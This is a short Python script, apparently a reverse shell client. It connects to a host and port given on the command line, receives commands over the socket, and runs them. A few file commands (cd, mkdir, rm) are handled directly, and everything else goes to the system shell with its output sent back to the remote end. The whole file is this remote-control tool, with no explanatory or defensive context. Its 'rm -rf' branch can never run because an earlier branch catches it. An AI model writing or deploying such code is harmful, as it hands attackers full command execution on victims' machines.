from sys import argv as arg
from os import chdir, makedirs, remove, removedirs
import socket
import subprocess

try:
    host = arg[1]
    port = arg[2]
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((host, int(port)))
        print(f"Connected in {host} - {port}")
        command = sock.recv(4096).decode().replace("\n", "")

        while command != "exit":
            cmd = command.split(sep=" ")

            if cmd[0] == "cd":
                chdir(cmd[1])
            elif cmd[0] == "mkdir":
                makedirs(cmd[1])
            elif cmd[0] == "del" or cmd[0] == "rm":
                remove(cmd[1])
            elif cmd[0] == "rm" and cmd[1] == "-rf":
                removedirs(cmd[2])
            else:
                command_result = subprocess.run(command, shell=True, capture_output=True)
                if command_result.returncode == 0:
                    sock.send(command_result.stdout)
                else:
                    sock.send(command_result.stderr)

            command = sock.recv(4096).decode().replace("\n", "")

except Exception as e:
    print(e)